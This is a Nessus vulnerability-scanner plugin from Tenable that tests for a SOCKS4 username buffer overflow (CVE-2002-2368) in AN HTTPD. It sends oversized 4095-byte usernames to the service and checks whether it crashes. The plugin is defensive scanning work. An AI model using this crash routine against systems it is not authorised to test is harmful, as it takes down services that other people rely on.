#
# (C) Tenable Network Security, Inc.
# 

# References:
# Message-ID: <20021020163345.19911.qmail@securityfocus.com>
# Date: Mon, 21 Oct 2002 01:38:15 +0900
# From:"Kanatoko" <anvil@jumperz.net>
# To: bugtraq@securityfocus.com
# Subject: AN HTTPD SOCKS4 username Buffer Overflow Vulnerability
#
# Vulnerable:
# AN HTTPD
#

include("compat.inc");

if(description)
{
 script_id(11164);
 script_version ("$Revision: 1.20 $");

 script_cve_id("CVE-2002-2368");
 script_bugtraq_id(5147);
 script_osvdb_id(2081, 55662);

 script_name(english:"NEC SOCKS4 Module Username Handling Remote Overflow");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote SOCKS service is prone to a buffer overflow attack."
 );
 script_set_attribute(attribute:"description", value:
"The SOCKS4 service running on the remote host crashes when it receives
a request with a long username.  An attacker may be able to leverage
this issue to disable the remote service or even execute arbitrary
code on the affected host." );
 script_set_attribute(
  attribute:"solution", 
  value:"Contact the vendor for a fix."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_cwe_id(119);
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/11/25");
 script_cvs_date("$Date: 2015/12/04 17:38:20 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english:"Too long username kills the SOCKS4 server");
 
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2015 Tenable Network Security, Inc.");
 script_family(english:"Firewalls");
 script_require_ports("Services/socks4", 1080);
 script_dependencie("find_service1.nasl");
 exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");

function mkreq(port, user)
{
  # Create a connection request.
  return
    raw_string(4) +          	 # Protocol version
    raw_string(1) +          	 # Command code to establish a stream conneciton
    mkword(port) +           	 # Port to connect to
    raw_string(10, 10, 10, 10) + # IP address
    user + raw_string(0);        # User ID
}

rport = 8080;
timeout = 30;

port = get_service(svc:"socks4", default:1080, exit_on_fail:TRUE);
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

# All parameters in SOCKS4 are big-endian.
set_byte_order(BYTE_ORDER_BIG_ENDIAN);

# Create a benign connection request and send it.
req = mkreq(port:rport, user:"nessus");

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_PORT_CLOSED, port);
send(socket:soc, data:req);
res = recv(socket:soc, length:8, timeout:timeout);
close(soc);

# Confirm that the target responded.
if (!res) audit(AUDIT_RESP_NOT, port);

# Confirm that the response is in the expected format.
status = getbyte(blob:res, pos:1);
if (
  strlen(res) != 8 ||
  getbyte(blob:res, pos:0) != 0x00 ||
  status < 0x5A ||
  status > 0x5D
) audit(AUDIT_RESP_BAD, port);

# A username consisting of about 4 KB should be enough.
req = mkreq(port:rport, user:crap(4095));

# Check if we can crash the service.
alive = TRUE;
for (i = 0; alive && i < 6; i++)
{
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_PORT_CLOSED, port);
  send(socket:soc, data:req);
  res = recv(socket:soc, length:8, timeout:timeout);
  close(soc);

  soc = open_sock_tcp(port);
  if (!soc)
    alive = (service_is_dead(port: port) <= 0);
  close(soc);
}

if (alive)
  audit(AUDIT_LISTEN_NOT_VULN, "SOCKS4", port);

security_hole(port);
